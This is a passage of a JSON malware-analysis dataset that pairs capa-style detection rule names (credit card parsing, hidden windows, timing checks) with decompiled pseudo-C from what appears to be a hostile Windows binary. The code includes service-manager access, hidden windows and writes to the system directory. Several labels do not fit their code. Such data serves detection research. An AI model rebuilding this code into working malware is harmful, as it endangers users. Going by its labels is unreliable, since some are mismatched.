iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.00401990(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 636
    },
    "00403210": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00403210(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00401610;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x407010;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 216
    },
    "00403310": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004033a3) overlaps instruction at (ram,0x004033a0)\n// \n// WARNING: Removing unreachable block (ram,0x00403339)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403310(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uchar in_AL;\n    uchar uVar1;\n    uint *puVar2;\n    uint32_t extraout_ECX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uchar *unaff_EBX;\n    uint unaff_ESI;\n    uint *puVar5;\n    uint32_t unaff_EDI;\n    uint16_t in_ES;\n    uint16_t in_SS;\n    bool bVar6;\n    uint32_t noname_2;\n    uint32_t noname_3;\n    uchar *arg_ch_00;\n    uchar var_28h;\n    uint var_27h;\n    uint *var_8h;\n    uint32_t var_4h;\n    \n    noname_3 = unaff_EDI;\n    if ((0x27 < &stack0xfffffffc) && (SBORROW4(&stack0xfffffffc, 0x28) != &var_28h < 0)) {\n        in_SS = unaff_EDI;\n        noname_3 = unaff_EDI & 0xffff0000 | in_ES;\n        *(unaff_EDI | &stack0xfffffffc) = in_AL;\n    }\n    noname_2 = 7;\n    arg_ch_00 = unaff_EBX;\n    var_8h = fcn.004018f0(arg_18h, arg_1ch, 0x4111cc, 7);\n    bVar6 = var_8h == NULL;\n    if (bVar6) {\n        return 0;\n    }\n    if (!bVar6) {\n        noname_2 = noname_2 & 0xffff | extraout_ECX << 0x10;\n        uVar3 = (extraout_ECX >> 8 & 0xffff00) << 8 | extraout_ECX & 0xffff;\n        if (bVar6) {\n            noname_2 = 0x47;\n            *unaff_EBX = *unaff_EBX;\n            puVar2 = var_8h;\n            puVar5 = extraout_ECX << 0x10 | in_SS;\n            goto code_r0x004033b0;\n        }\n    }\n    uVar3 = 7;\n    puVar2 = NULL;\n    puVar5 = &var_27h;\n    var_28h = 0;\ncode_r0x004033b0:\n    for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar5 = puVar2;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = puVar2;\n    *(puVar5 + 2) = puVar2;\n    var_4h = 0;\n    do {\n        uVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n        (&var_28h)[var_4h] = uVar1;\n        var_4h = var_4h + 1;\n    } while (var_4h < 0x20);\n    puVar5 = &var_28h;\n    puVar2 = var_8h;\n    for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar2 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.004048b0(arg_8h, arg_ch, arg_10h, arg_14h, &var_28h, 0x20, var_8h);\n    fcn.00404720(arg_18h, arg_1ch, noname_2, noname_3, unaff_ESI, arg_ch_00);\n    return 1;\n}\n",
        "token_count": 931
    },
    "00405020": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00405020(uint arg_8h)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    uint var_4h;\n    \n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)();\n    uVar1 = fcn.004016a0(hSCManager, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 117
    },
    "00401880": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "hide graphical window"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401880(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x407010, 0x422620, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    return 1;\n}\n",
        "token_count": 137
    },
    "004018f0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.004018f0(char *arg_8h, int32_t arg_ch, char *arg_10h, int32_t arg_14h)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char *pcVar4;\n    bool bVar5;\n    \n    pcVar1 = arg_8h + (arg_ch - arg_14h);\n    if (arg_14h != 0) {\n        iVar2 = arg_14h;\n        if (arg_8h <= pcVar1) {\n            do {\n                if ((!SBORROW4(arg_8h, pcVar1)) && (SBORROW4(arg_8h, pcVar1))) {\n                    LOCK();\n                    iVar2 = 0x138b2633;\n                    arg_8h = arg_8h + 0x658f517f;\n                }\n                if (*arg_8h == *arg_10h) {\n                    bVar5 = true;\n                    pcVar3 = arg_8h;\n                    pcVar4 = arg_10h;\n                    do {\n                        iVar2 = iVar2 + -1;\n                        pcVar4 = pcVar4 + 1;\n                        pcVar3 = pcVar3 + 1;\n                        if (iVar2 == 0) break;\n                        bVar5 = *pcVar3 == *pcVar4;\n                    } while (bVar5);\n                    iVar2 = arg_14h;\n                    if (bVar5) {\n                        return arg_8h;\n                    }\n                }\n                arg_8h = arg_8h + 1;\n            } while (arg_8h <= pcVar1);\n        }\n        arg_8h = NULL;\n    }\n    return arg_8h;\n}\n",
        "token_count": 388
    },
    "00401990": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401990(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (arg_ch != 0) {\n        do {\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            *(uVar2 + arg_8h) = iVar1 % 0x1a + 'a';\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_ch);\n    }\n    return;\n}\n",
        "token_count": 130
    },
    "00403190": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403190(uint arg_8h, uint arg_ch)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    uint var_4h;\n    \n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)();\n    fcn.00401200(hSCManager, arg_8h);\n    uVar1 = fcn.004042b0(hSCManager, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 140
    },
    "00403470": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403534) overlaps instruction at (ram,0x00403532)\n// \n\nuint fcn.00403470(void)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t extraout_ECX;\n    uint *arg_ch;\n    uint extraout_ECX_00;\n    char *unaff_EBX;\n    uint *puVar4;\n    int32_t unaff_ESI;\n    uint *puVar5;\n    uchar uVar6;\n    bool bVar7;\n    uchar uVar8;\n    char cVar9;\n    char cVar10;\n    float10 fVar11;\n    uint *puStack568;\n    int32_t iStack564;\n    uint *puStack560;\n    uint uStack531;\n    uchar uStack272;\n    uint uStack271;\n    \n    puVar5 = &stack0xfffffded;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    uStack272 = 0;\n    puVar5 = &stack0xfffffef1;\n    for (iStack564 = 0x40; iStack564 != 0; iStack564 = iStack564 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    puStack560 = puVar5 + 3U & 0xffff | unaff_ESI << 0x10;\n    uVar6 = 0;\n    cVar10 = '\\0';\n    cVar9 = 0;\n    uVar8 = 0;\n    puVar4 = &stack0xfffffffc & 0xffff0000 | *0x10 - 4;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    puStack560 = puVar4 + -0x84;\n    puStack568 = puVar4 + -0x43;\n    iStack564 = 0x41119c;\n    (*_sym.imp.MSVCRT.dll_sprintf)();\n    if ((uVar6 || uVar8) || (!uVar6 && !uVar8)) {\n        arg_ch = puVar4 + -2;\n    }\n    else {\n        arg_ch = extraout_ECX & 0xffff0000 | CONCAT11((extraout_ECX >> 8) - *unaff_EBX, extraout_ECX);\n        puVar5[-0x1c] = puVar5[-0x1c] - &stack0xfffffdc8;\n        cVar10 = SBORROW4(puVar4, 1);\n        puVar4 = puVar4 + -1;\n        cVar9 = puVar4 < 0;\n    }\n    fVar11 = fcn.00404f70(puVar4 + -1, arg_ch);\n    if ((!cVar9) && (cVar9)) {\n        *(puVar5 + 0x1f) = fVar11;\n        cVar10 = SBORROW1(*(unaff_ESI + 4), *(puVar5 + 7));\n        cVar9 = *(unaff_ESI + 4) - *(puVar5 + 7) < '\\0';\n    }\n    fcn.004035a0(puVar4[-1]);\n    if (cVar10 == cVar9) {\n        if (cVar10 != cVar9) {\n            puVar4 = puVar4 + -1;\n            uVar2 = extraout_ECX_00;\n            goto code_r0x00403537;\n        }\n    }\n    uVar2 = puVar4[-2];\ncode_r0x00403537:\n    uVar1 = fcn.00404310(puVar4 + -0x43, 0x4111bc, puVar4[-1], uVar2);\n    bVar7 = (POPCOUNT(uVar1 & 0xff) & 1U) != 0;\n    if (uVar1 == 0) {\n        return 0;\n    }\n    if ((bVar7) && (!bVar7)) {\n        puVar5 = &stack0xfffffdd8;\n        cVar9 = '\\x1e';\n        do {\n            puVar4 = puVar4 + -1;\n            puVar5 = puVar5 + -1;\n            *puVar5 = *puVar4;\n            cVar9 = cVar9 + -1;\n        } while ('\\0' < cVar9);\n        uVar2 = in(0x78);\n        return uVar2;\n    }\n    puStack560 = 0x403585;\n    fcn.00401730(puVar4 + -0x43, 0xffffffff);\n    return 1;\n}\n",
        "token_count": 1114
    },
    "00403a20": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403ac2) overlaps instruction at (ram,0x00403abe)\n// \n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.00403a20(int32_t *hWnd)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t *piVar8;\n    uint *puVar9;\n    uint *in_FS_OFFSET;\n    uint8_t uVar10;\n    uint8_t in_AF;\n    char cVar11;\n    char cVar12;\n    unkbyte10 extraout_ST0;\n    ulong uVar13;\n    uint var_24ch;\n    uchar var_148h;\n    uint var_147h;\n    int32_t hLibModule;\n    int32_t var_40h;\n    int32_t pbstr;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    int32_t *var_28h;\n    int32_t Msg;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x405320;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    (*_sym.imp.ole32.dll_CoInitialize)();\n    hLibModule = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    if (hLibModule == 0) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    Msg = (*_sym.imp.USER32.dll_RegisterWindowMessageA)();\n    uVar10 = 0;\n    cVar12 = '\\0';\n    cVar11 = '\\0';\n    uVar13 = (*_sym.imp.USER32.dll_SendMessageTimeoutA)(hWnd, Msg, 0, 0, 2, 1000, &var_18h);\n    piVar8 = uVar13 >> 0x20;\n    if ((cVar12 == cVar11) && (cVar12 != cVar11)) {\n        *(uVar13 + -0x7ce92414) = extraout_ST0;\n        uVar3 = uVar13 - 1;\n        uVar2 = uVar3;\n        in_AF = 9 < (uVar2 & 0xf) | in_AF;\n        uVar2 = uVar2 + in_AF * '\\x06';\n        uVar3 = uVar3 & 0xffffff00 | uVar2 + (0x90 < (uVar2 & 0xf0) | uVar10 | in_AF * (0xf9 < uVar2)) * '`';\n        *piVar8 = *piVar8 + 0x458bdf84;\n        puVar1 = uVar3 - 1;\n        uVar10 = *puVar1;\n        uVar2 = uVar13 >> 0x20;\n        *puVar1 = *puVar1 + uVar2;\n        pcVar4 = sym.imp.KERNEL32.dll_GetProcAddress + CARRY1(uVar10, uVar2) + uVar3;\n    }\n    else {\n        pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(hLibModule, 0x411590);\n    }\n    if (pcVar4 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_20h = NULL;\n    var_4h = 0;\n    iVar5 = (*pcVar4)(var_18h, str._D_3, 0, &var_20h);\n    if ((iVar5 < 0) || (var_20h == NULL)) {\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    else {\n        var_28h = NULL;\n    // WARNING: Ignoring partial resolution of indirect\n        var_4h._0_1_ = 1;\n        iVar5 = (**(*var_20h + 0x20))(var_20h, &var_28h);\n        if ((iVar5 < 0) || (var_28h == NULL)) {\n    // WARNING: Ignoring partial resolution of indirect\n            var_4h._0_1_ = 0;\n        }\n        else {\n            var_1ch = 0;\n            (**(*var_28h + 0x24))(var_28h, &var_1ch);\n            Msg = 0;\n            if (0 < var_1ch) {\n                do {\n                    var_30h = (*_sym.imp.MSVCRT.dll_rand)();\n                    var_30h = var_30h % var_1ch;\n                    var_38h = CONCAT22(var_38h._2_2_, 3);\n                    hWnd = NULL;\n                    var_10h = NULL;\n    // WARNING: Ignoring partial resolution of indirect\n                    var_4h._0_1_ = 4;\n                    iVar5 = (**(*var_28h + 0x2c))\n                                      (var_28h, var_38h, var_34h, var_30h, var_2ch, var_38h, var_34h, var_30h, var_2ch, \n                                       &hWnd);\n                    if ((iVar5 < 0) || (hWnd == NULL)) {\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 3;\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 2;\njoined_r0x00403e4f:\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\ncode_r0x00403e5b:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_38h);\n                        break;\n                    }\n                    iVar5 = (***hWnd)(hWnd, 0x4061b0, &var_10h);\n                    if ((iVar5 < 0) || (var_10h == NULL)) {\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 3;\njoined_r0x00403e16:\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                        goto code_r0x00403e5b;\n                    }\n                    iVar5 = (**(*var_10h + 0x38))(var_10h, &pbstr);\n                    if (iVar5 < 0) {\ncode_r0x00403dd7:\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 3;\n                        goto joined_r0x00403e16;\n                    }\n                    if (pbstr == 0) {\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 3;\njoined_r0x00403c52:\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    else {\n                        fcn.00403820(pbstr, &var_24ch, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                        iVar6 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_24ch, 0x4115a4);\n                        if (iVar6 != 0) {\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 3;\n                            goto joined_r0x00403c52;\n                        }\n                        var_14h = NULL;\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 5;\n                        iVar5 = (***hWnd)(hWnd, 0x4061a0, &var_14h);\n                        if ((iVar5 < 0) || (var_14h == NULL)) {\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 3;\njoined_r0x00403dfb:\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 2;\n                            goto joined_r0x00403e4f;\n                        }\n                        iVar5 = (**(*var_14h + 0x20))(var_14h, &var_40h);\n                        iVar6 = var_40h;\n                        if (iVar5 < 0) {\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 3;\n                            goto joined_r0x00403dfb;\n                        }\n                        if (var_40h == 0) {\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 2;\n                        }\n                        else {\n                            var_148h = 0;\n                            puVar9 = &var_147h;\n                            for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {\n                                *puVar9 = 0;\n                                puVar9 = puVar9 + 1;\n                            }\n                            *puVar9 = 0;\n                            *(puVar9 + 2) = 0;\n                            fcn.00403820(iVar6, &var_148h, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(var_40h);\n                            iVar6 = fcn.00403950(&var_148h);\n                            if (iVar6 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(*var_10h + 0x114))(var_10h);\n    // WARNING: Ignoring partial resolution of indirect\n                                var_4h._0_1_ = 4;\n                                if (var_14h != NULL) {\n                                    (**(*var_14h + 8))(var_14h);\n                                }\n                                goto code_r0x00403dd7;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 2;\n                        }\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_38h);\n                    Msg = Msg + 1;\n                } while (Msg < var_1ch);\n            }\n    // WARNING: Ignoring partial resolution of indirect\n            var_4h._0_1_ = 0;\n        }\n        if (var_28h != NULL) {\n            (**(*var_28h + 8))(var_28h);\n        }\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(hLibModule);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = var_ch;\n    return iVar5;\n}\n",
        "token_count": 3081
    },
    "00403f60": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403f7b) overlaps instruction at (ram,0x00403f7a)\n// \n\nuint32_t __cdecl fcn.00403f60(uint32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint8_t *unaff_EBX;\n    uint *unaff_ESI;\n    uint *puVar2;\n    bool bVar3;\n    uint32_t *puVar4;\n    uchar var_108h;\n    uint var_107h;\n    int32_t var_4h;\n    \n    if ((&var_108h < 0) || (&var_108h >= 0)) {\n        unaff_ESI = &var_4h;\n    }\n    else {\n        arg_8h = in_EAX + -0x1bf31dd6;\n        *unaff_EBX = *unaff_EBX & 0xc3;\n    }\n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(arg_8h, unaff_ESI);\n    if (arg_ch != var_4h) {\n        return 1;\n    }\n    bVar3 = false;\n    _var_108h = _var_108h & 0xffffff00;\n    puVar2 = &var_107h;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    puVar4 = arg_8h;\n    (*_sym.imp.USER32.dll_GetClassNameA)(arg_8h, &var_108h, 0x104);\n    if ((!bVar3) && (bVar3)) {\n        *puVar4 = _var_108h;\n        return _var_108h;\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_108h, 0x41154c);\n    if (iVar1 != 0) {\n        return 1;\n    }\n    (*_sym.imp.USER32.dll_EnumChildWindows)(arg_8h, 0x403ee0, 0);\n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    (*_sym.imp.KERNEL32.dll_Sleep)((iVar1 % 10 + 4) * 1000);\n    (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x10, 0, 0);\n    return 0;\n}\n",
        "token_count": 594
    },
    "00404310": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404310(uint filename, uint mode, uint ptr, uint nitems)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)(filename, mode);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.MSVCRT.dll_fwrite)(ptr, 1, nitems, iVar1);\n    (*_sym.imp.MSVCRT.dll_fflush)(iVar1);\n    (*_sym.imp.MSVCRT.dll_fclose)(iVar1);\n    return 1;\n}\n",
        "token_count": 131
    },
    "00404480": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404520) overlaps instruction at (ram,0x0040451f)\n// \n// WARNING: Removing unreachable block (ram,0x00404510)\n// WARNING: Removing unreachable block (ram,0x00404515)\n// WARNING: Removing unreachable block (ram,0x0040458b)\n\nuint fcn.00404480(uchar param_1)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint uStack308;\n    uint auStack304 [73];\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    iVar3 = (**0x422628)(2, 0);\n    if (iVar3 == -1) {\n        return 0xffffffff;\n    }\n    uStack308 = 0x128;\n    puVar5 = auStack304;\n    var_8h = iVar3;\n    for (iVar4 = 0x49; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    iVar4 = (**0x42262c)(iVar3, &uStack308);\n    pcVar2 = _sym.imp.MSVCRT.dll__stricmp;\n    uVar1 = var_4h;\n    while( true ) {\n        var_4h = uVar1;\n        if (iVar4 == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n            return uVar1;\n        }\n    // WARNING: Bad instruction - Truncating control flow here\n        iVar4 = (*pcVar2)(0xf0, param_1);\n        if (iVar4 == 0) break;\n        iVar4 = (**0x422630)(iVar3, 0xcc);\n        uVar1 = var_4h;\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(var_8h);\n    return auStack304[1];\n}\n",
        "token_count": 478
    },
    "null": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl main(uint argv)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    uint lpMsg;\n    \n    iVar4 = fcn.00403210(argv);\n    if ((iVar4 != 0) && (iVar5 = fcn.00401880(argv),  pcVar3 = _sym.imp.USER32.dll_GetMessageA,  iVar5 != 0)) {\n        iVar5 = (*_sym.imp.USER32.dll_GetMessageA)(&lpMsg, 0, 0, 0);\n        pcVar2 = _sym.imp.USER32.dll_TranslateMessage;\n        pcVar1 = _sym.imp.USER32.dll_GetDesktopWindow;\n        while (iVar5 != 0) {\n            (*pcVar2)(&lpMsg);\n            (*pcVar1)();\n            (*_sym.imp.USER32.dll_DispatchMessageA)(&lpMsg);\n            iVar5 = (*pcVar3)(&lpMsg, 0, 0, 0);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 240
    },
    "00404f70": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404f70(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00404d40(&var_68h, &var_4h);\n    fcn.00402f20(&var_68h, var_4h, 0x411608, 0x11000);\n    *arg_8h = 0x411608;\n    *arg_ch = 0x11000;\n    return;\n}\n",
        "token_count": 240
    },
    "00401bd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00401bd0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00403000(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 53
    },
    "00401e90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00401e90(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 49
    },
    "00402e90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
